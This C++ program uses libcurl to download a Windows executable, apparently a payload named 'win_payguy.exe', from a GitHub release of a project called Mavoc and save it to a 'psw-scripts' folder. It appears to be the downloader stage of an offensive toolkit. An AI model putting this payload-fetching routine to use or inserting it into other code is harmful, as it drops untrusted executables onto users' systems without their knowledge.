#include <iostream>
#include <curl/curl.h>

using namespace std;
size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    FILE* file = (FILE*)userp;
    return fwrite(contents, size, nmemb, file);
}

int main() {
    const char* url = "https://github.com/Whitecat18/Mavoc/releases/download/v1.0.0/win_payguy.exe";
    
    const char* outputFilePath = "psw-scripts/win_payguy.exe";

    CURL* curl = curl_easy_init();
    if (curl) {
        FILE* outputFile = fopen(outputFilePath, "wb");
        if (outputFile) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, outputFile);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK)
                cerr << "Error downloading the file: " << curl_easy_strerror(res) << std::endl;

            fclose(outputFile);
        } else {
            cerr << "Failed to open the output file." << std::endl;
        }

        curl_easy_cleanup(curl);
    } else {
        cerr << "Failed to initialize libcurl." << std::endl;
    }

    return 0;
}
